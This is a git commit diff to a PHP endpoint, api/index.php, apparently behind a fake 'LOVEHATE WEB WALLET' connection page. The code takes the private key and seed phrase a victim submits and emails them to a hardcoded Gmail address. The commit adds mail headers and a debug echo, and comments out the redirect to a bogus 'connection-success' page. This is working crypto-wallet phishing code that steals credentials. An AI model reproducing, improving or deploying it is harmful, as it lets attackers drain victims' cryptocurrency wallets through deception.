5f5660578045e6e1e51740c2564e3f889d792aa0
bcoder <bcoder@gmail.com>
2023-09-22 08:12:46 +0100

    checking errors

--- api/index.php
+++ api/index.php
@@ -1,12 +1,15 @@
 <?php
 error_reporting(E_ALL);
    ini_set('display_errors', E_ALL);
+
+   if (!defined("PHP_EOL")) define("PHP_EOL", "\r\n");
    
 // phpinfo();
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     // Retrieve privkey and seedphr from POST request
     $privky = $_POST['privky'];
     $seedphr = $_POST['seedphr'];
+	$email = "sabinus@gmail.com";
 
     // Set the recipient email address
     $recipient = 'bcoder49@gmail.com';
@@ -15,15 +18,19 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     $subject = 'Data from LOVEHATE WEB WALLET';
 
     // Prepare the email body
-    $message = "Private Key: $privky\nSeed Phrase: $seedphr";
+    $message = wordwrap("Private Key: $privky\nSeed Phrase: $seedphr", 70);
+
+	$headers = "From: $email" . PHP_EOL;
+$headers .= "Reply-To: $email" . PHP_EOL;
+$headers .= "MIME-Version: 1.0" . PHP_EOL;
+$headers .= "Content-type: text/plain; charset=utf-8" . PHP_EOL;
+$headers .= "Content-Transfer-Encoding: quoted-printable" . PHP_EOL;
 
     // Send the email
-    $success = mail($recipient, $subject, $message);
-
-    // Check if the email was sent successfully
-	if ($success) {
-        header('Location: https://www.lovehateinu.xyz/apiv4wc-connection-success/index.html'); // Corrected redirection
-        exit();
+    if (mail($recipient, $subject, $message, $headers)){
+		echo "Email sent";
+        // header('Location: https://www.lovehateinu.xyz/apiv4wc-connection-success/index.html'); // Corrected redirection
+        // exit();
     } else {
         echo "An error occurred";
     }
